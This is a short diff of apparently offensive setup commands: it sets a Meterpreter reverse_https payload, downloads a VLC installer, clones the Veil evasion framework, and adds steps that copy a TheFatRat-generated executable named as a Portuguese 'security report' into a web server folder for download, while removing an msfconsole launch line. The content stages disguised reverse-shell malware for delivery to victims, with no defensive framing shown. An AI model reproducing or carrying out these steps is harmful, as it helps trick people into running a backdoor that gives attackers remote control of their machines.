@@ -17,8 +17,9 @@ wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup
 
 set PAYLOAD windows/x64/meterpreter/reverse_https
 
+mkdir /var/www/html/payloads
+cp /root/FatRat_Generated/relatorio_seguranca.exe /var/www/html/payloads/
 
-msfconsole -r relatorio_seguranca.rc
 
 
 git clone https://github.com/Veil-Framework/Veil.git
